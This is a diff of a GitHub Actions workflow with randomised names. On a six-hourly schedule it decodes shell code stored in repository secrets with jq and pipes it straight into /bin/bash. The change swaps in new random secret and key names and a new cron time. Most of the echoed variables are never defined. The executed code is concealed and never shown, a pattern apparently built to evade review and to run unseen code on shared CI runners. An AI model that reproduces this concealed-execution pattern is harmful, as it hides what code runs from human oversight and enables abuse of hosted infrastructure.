@@ -1,10 +1,8 @@
 name: qushubin3981
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 3/6 * * *'
-
+    - cron: '58 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,19 +10,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: qushubin3981
         env:
-          lvj48609: ${{ secrets.lvj48609 }}
+          qrauq6: ${{ secrets.qrauq6 }}
         run: |
-          echo $lvj48609 | jq -r .c33 | /bin/bash
-          echo $by886 | jq -r .lawsc28 | /bin/bash
-          echo $mjeby2098 | jq -r .keis919 | /bin/bash
-          echo $i24 | jq -r .l99 | /bin/bash
-          echo $qwhnu3 | jq -r .bqfw94 | /bin/bash
-          echo $wt06858 | jq -r .hxtf15275 | /bin/bash
-          echo $s4957 | jq -r .kvyd84325 | /bin/bash
-          echo $ptta80 | jq -r .skcsb7775 | /bin/bash
-          echo $zzlhx90 | jq -r .nvmw11 | /bin/bash
-          echo $qw9 | jq -r .w5 | /bin/bash
-          echo $dbnd250 | jq -r .hd6 | /bin/bash
-          echo $ruf570 | jq -r .kkd08461 | /bin/bash
-          echo $mupdo76 | jq -r .ollxd51977 | /bin/bash
+          echo $qrauq6 | jq -r .iueh634 | /bin/bash
+          echo $uqc6988 | jq -r .o300 | /bin/bash
+          echo $upazb7 | jq -r .mrhpr152 | /bin/bash
+          echo $kg069 | jq -r .xa9 | /bin/bash
+          echo $rr541 | jq -r .jk3618 | /bin/bash
+          echo $xvecb1179 | jq -r .uwjg418 | /bin/bash
+          echo $esoz4 | jq -r .bfx4 | /bin/bash
+          echo $r87 | jq -r .e8641 | /bin/bash
+          echo $snsbn9624 | jq -r .rgr3013 | /bin/bash
+          echo $fn0 | jq -r .qcnlc58761 | /bin/bash
 
